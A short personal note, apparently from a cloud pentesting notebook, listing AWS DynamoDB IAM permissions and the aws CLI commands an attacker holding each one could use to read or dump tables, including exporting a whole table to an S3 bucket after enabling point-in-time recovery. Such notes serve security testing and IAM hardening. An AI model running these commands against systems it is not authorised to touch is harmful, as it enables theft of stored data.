---
title: DynamoDB
updated: 2023-01-04 07:27:28Z
created: 2022-12-31 07:31:47Z
latitude: 27.71724530
longitude: 85.32396050
altitude: 0.0000
---

## dynamodb:BatchGetItem

With this privilege, Attacker can get contents from the tables with the help of primary key which can be obtained through enumerating metadata of the table. `describe-table`

- `aws dynamodb batch-get-item --request-items file:///tmp/test.json`

```
// test.json
{
    "ProductCatalog" : { // This is the table name
        "Keys": [
            {
            "Id" : { // Primary keys name
                "N": "32" // Value to search for, you could put here entries from 1 to 1000 to dump all those
            }
            }
        ]
    }
}
```

## dynamodb:GetItem

Similar to `BatchGetItem`, attacker can get contents from just one given table instead of dumping all the contents, with the help of primary key.

- `aws dynamodb get-item --table-name ProductCatalog --key`

```
file:///tmp/test.json

// test.json
{ 
"Id" : { 
    "N": "100"
}
}
```

## dynamodb:Query

Similar to `GetItem`, It allows attackers to leverage a subset of comparisons, but the only comparison authorized with the primary key (which must be provided) is `EQ` so they can't use a comparison to obtain the whole database in a request.

- `aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/test.json`

```
 // test.json
 { 
"Id" : { 
    "ComparisonOperator":"EQ",
    "AttributeValueList": [ {"N": "100"} ]
    }
}
```

## dynamodb:Scan

With this privilege, attacker can easily dump the entire table.

- `aws dynamodb scan --table-name <table_name>`

## dynamodb:PartiQLSelect

With this privilege, attacker can easily dump the entire table.

- `aws dynamodb execute-statement --statement "SELECT * FROM ProductCatalog"`

## dynamodb:UpdateContinuousBackups | dynamodb:ExportTableToPointInTime

With this privilege, attacker can export the whole table to a S3 bucket. But this to work the table needs to have point-in-time-recovery enabled. `describe-continuous-backups`

- `aws dynamodb export-table-to-point-in-time --table-arn <arn> --s3-bucket <bucket_name>`

If the point-in-time-recovery is not enabled, it can be enabled using the following command, but attacker will need `dynamodb:ExportTableToPointInTime` permission.

- `aws dynamodb update-continuous-backups --table-name <value> --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true`

## Potential Impacts

It is Indirect privilege escalation by locating sensitive information an contents inside the tables.